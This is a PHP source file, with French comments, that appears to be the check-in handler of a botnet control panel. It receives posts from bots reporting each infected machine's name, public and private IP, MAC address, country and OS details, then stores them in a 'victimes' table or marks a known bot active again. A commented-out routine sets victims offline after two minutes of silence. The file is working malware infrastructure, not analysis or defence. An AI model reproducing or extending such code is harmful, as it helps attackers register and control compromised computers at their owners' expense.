<?php
// inclusion des paramètres
include ('bootstrap.php');
// inclusion des paramètres
/*
        function checkUserActivity($conn, $ip)
		{
			$timeout = 120; // 2 minutes en secondes
			
			// Vérifier si l'utilisateur a une entrée dans la base de données
			$sql = "SELECT statut, created FROM victimes WHERE adresse_ip = :adresse_ip";
			$stmt = $conn->prepare($sql);
			$stmt->bindParam(':adresse_ip', $ip);
			$stmt->execute();
			
			$row = $stmt->fetch(PDO::FETCH_ASSOC);
			
			if ($row) {
				$statut = $row["statut"];
				
				// Vérifier si le statut est ON depuis plus de 2 minutes
				if ($statut === "ON") {
					$lastUpdate = strtotime($row["created"]);
					$currentTime = time();
					
					if ($currentTime - $lastUpdate >= $timeout) {
						// Mettre à jour le statut de l'utilisateur en OFF
						$sql = "UPDATE victimes SET statut = 'OFF' WHERE id_machine = :id_machine";
						$stmt = $conn->prepare($sql);
						$stmt->bindParam(':id_machine', $ip);
						$stmt->execute();
					}
				}
			}
		}
*/

if (isset($_POST['add'])) {

    $id_victime =  generer(5); 
    $id_bot =  $_POST['id_bot'];
    $nom_machine = $_POST['nom_machine'];
    $ip_public = $_POST['ip_public'];
    $ip_prive = $_POST['ip_prive'];
    $mac_adresse = $_POST['mac_adresse'];
    $pays = $_POST['pays'];
    $systeme_version = $_POST['systeme_version'];
    $systeme_arch = $_POST['systeme_arch'];
    $status = "on";

    // Vérifier si le bot a une entrée dans la base de données
    if (is_already_in_use('id_bot', $id_bot, 'victimes')){
        // Garder la connexion ouverte
        // changer le status sur on (afin de le garder octif)
        $activate = $db->prepare( "UPDATE `victimes` SET status = ? WHERE id_bot=?")
                        ->execute([ "on", $id_bot ]);
    } else {
        $req_victime = $db->prepare("INSERT INTO `victimes` ( `id_victime`,`id_bot`,`nom_machine`,`ip_public`,`ip_prive`,`mac_adresse`,`pays`,`systeme_version`,`systeme_arch`,`status`,`created_at` )
                                        VALUES (:id_victime, :id_bot, :nom_machine, :ip_public, :ip_prive, :mac_adresse, :pays, :systeme_version, :systeme_arch, :status,NOW())
                                        ON DUPLICATE KEY UPDATE id_bot = 'id_bot';");
            $req_victime->execute([
                'id_victime' => $id_victime ,
                'id_bot' => $id_bot ,
                'nom_machine' => $nom_machine ,
                'ip_public' => $ip_public ,
                'ip_prive' => $ip_prive ,
                'mac_adresse' => $mac_adresse ,
                'pays' => $pays ,
                'systeme_version' => $systeme_version ,
                'systeme_arch' => $systeme_arch ,
                'status' => $status
            ]);

        // {succes}
        // try {
        // { je pensais à mettre le script de l'inscription ici pour gérer en même temps les exceptions quuois}
        // } catch(PDOException $e) {
        //     echo "Erreur lors de la mise à jour des informations de la victime : " . $e->getMessage();
        //      // {alternatif en cas d'erreur}
        // }
    }

}

//require("views/home.view.php");
